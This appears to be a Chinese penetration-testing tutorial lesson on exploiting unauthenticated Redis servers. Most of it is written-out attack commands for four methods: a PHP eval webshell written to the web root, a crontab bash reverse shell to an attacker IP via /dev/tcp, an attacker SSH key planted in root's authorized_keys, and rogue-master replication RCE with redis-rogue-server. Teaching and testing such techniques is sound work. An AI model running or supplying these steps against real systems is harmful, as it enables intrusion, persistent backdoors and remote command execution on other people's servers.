# 网络安全教程：P59：Redis漏洞利用 🎯

![](img/68db3cc20b704ba8a9f70231acee00e7_1.png)

在本节课中，我们将学习Redis未授权访问漏洞的几种利用方法，包括写入Webshell、写入定时任务反弹Shell、写入SSH公钥以及利用主从复制RCE。这些技术是渗透测试中针对配置不当的Redis服务的关键攻击手段。

![](img/68db3cc20b704ba8a9f70231acee00e7_3.png)

## 连接Redis服务

![](img/68db3cc20b704ba8a9f70231acee00e7_5.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_7.png)

上一节我们介绍了Redis未授权访问漏洞的原理，本节中我们来看看如何连接存在此漏洞的Redis服务。

![](img/68db3cc20b704ba8a9f70231acee00e7_9.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_10.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_12.png)

Redis并非Web服务，需要使用其客户端程序进行连接。首先需要下载并编译Redis客户端。

以下是连接Redis服务的基本命令格式：
```bash
redis-cli -h <目标IP> -p 6379
```
如果连接成功且未要求认证，则证明存在未授权访问漏洞。连接后可以执行`info`命令查看服务器信息。

## 写入Webshell

![](img/68db3cc20b704ba8a9f70231acee00e7_18.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_20.png)

成功连接后，我们可以尝试写入Webshell以获取服务器控制权。此方法的前提是目标服务器同时运行了Web服务（如Apache、Nginx），并且我们需要知道网站根目录的绝对路径。

![](img/68db3cc20b704ba8a9f70231acee00e7_22.png)

以下是写入Webshell的具体步骤：

![](img/68db3cc20b704ba8a9f70231acee00e7_24.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_25.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_27.png)

1.  **设置备份目录**：通过Redis配置指令，将数据库备份目录设置为Web根目录。
    ```bash
    config set dir /var/www/html
    ```
2.  **设置备份文件名**：指定备份文件名为Webshell的文件名。
    ```bash
    config set dbfilename shell.php
    ```
3.  **写入Webshell内容**：向数据库写入一个键值对，其值包含Webshell代码。
    ```bash
    set x "<?php @eval($_POST['pass']);?>"
    ```
4.  **保存到磁盘**：执行保存命令，将内存中的数据持久化到指定目录的文件中。
    ```bash
    save
    ```
    执行成功后，即可在Web目录下访问生成的`shell.php`文件，并使用中国菜刀等工具进行连接。

**关键点**：Web根目录路径因操作系统和Web服务器而异，例如Apache在Linux上通常是`/var/www/html`，需要结合信息收集结果进行判断。

![](img/68db3cc20b704ba8a9f70231acee00e7_29.png)

## 写入定时任务反弹Shell

![](img/68db3cc20b704ba8a9f70231acee00e7_31.png)

如果无法写入Webshell，可以尝试通过写入定时任务（Crontab）来反弹Shell。此方法适用于Linux系统。

![](img/68db3cc20b704ba8a9f70231acee00e7_33.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_35.png)

以下是利用定时任务反弹Shell的步骤：

1.  **设置备份目录为Crontab目录**：
    ```bash
    config set dir /var/spool/cron/
    ```
    *注：Ubuntu系统路径为`/var/spool/cron/crontabs/`，CentOS路径为`/var/spool/cron/`。*
2.  **设置备份文件名为对应用户**（如root）：
    ```bash
    config set dbfilename root
    ```
3.  **写入定时任务命令**：任务内容为向攻击机反弹Shell。
    ```bash
    set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/攻击机IP/攻击机端口 0>&1\n\n"
    ```
4.  **保存**：
    ```bash
    save
    ```
    保存后，目标服务器将每分钟执行一次该任务，在攻击机监听对应端口即可获得Shell。

![](img/68db3cc20b704ba8a9f70231acee00e7_39.png)

## 写入SSH公钥实现免密登录

当Redis以root权限运行时，可以通过写入SSH公钥到目标服务器的`~/.ssh/authorized_keys`文件，实现免密码登录。

![](img/68db3cc20b704ba8a9f70231acee00e7_41.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_43.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_45.png)

以下是具体操作流程：

1.  **在攻击机生成SSH密钥对**：
    ```bash
    ssh-keygen -t rsa
    ```
    默认会在`~/.ssh/`目录下生成`id_rsa`（私钥）和`id_rsa.pub`（公钥）。
2.  **将公钥内容写入一个文件**（如`pub.txt`），并确保格式正确（以换行符开头结尾）。
3.  **连接目标Redis**，清空当前数据库：
    ```bash
    flushall
    ```
4.  **设置备份目录为root用户的.ssh目录**：
    ```bash
    config set dir /root/.ssh/
    ```
5.  **设置备份文件名**：
    ```bash
    config set dbfilename authorized_keys
    ```
6.  **将公钥文件内容写入Redis并保存**：
    ```bash
    set x "\n\n公钥内容\n\n"
    save
    ```
7.  之后，攻击机即可使用对应的私钥直接SSH登录目标服务器。

## 利用主从复制RCE

![](img/68db3cc20b704ba8a9f70231acee00e7_53.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_55.png)

Redis 4.x/5.x版本的主从复制功能可被利用来加载恶意的`.so`扩展模块，从而实现远程代码执行（RCE）。

以下是利用步骤：

![](img/68db3cc20b704ba8a9f70231acee00e7_57.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_58.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_60.png)

1.  **准备利用工具**：下载并编译利用脚本（如`redis-rogue-server`）。
2.  **编译恶意模块**：工具包中的`exp.so`文件需在目标架构环境下编译。
3.  **运行利用脚本**：指定目标Redis地址、端口、攻击机地址及要执行的命令。
    ```bash
    python3 redis-rogue-server.py -r 目标IP -p 目标端口 -L 攻击机IP -P 攻击机端口 -f exp.so -c "要执行的命令"
    ```
4.  脚本运行后，会模拟一个恶意的Redis主节点，诱使目标Redis（从节点）同步数据并加载`exp.so`模块，从而执行任意命令。

![](img/68db3cc20b704ba8a9f70231acee00e7_62.png)

![](img/68db3cc20b704ba8a9f70231acee00e7_64.png)

**核心原理**：攻击者搭建一个伪造的Redis主服务器，通过Redis的主从复制机制，让目标Redis服务器从攻击者处同步包含恶意模块的数据，进而实现代码执行。
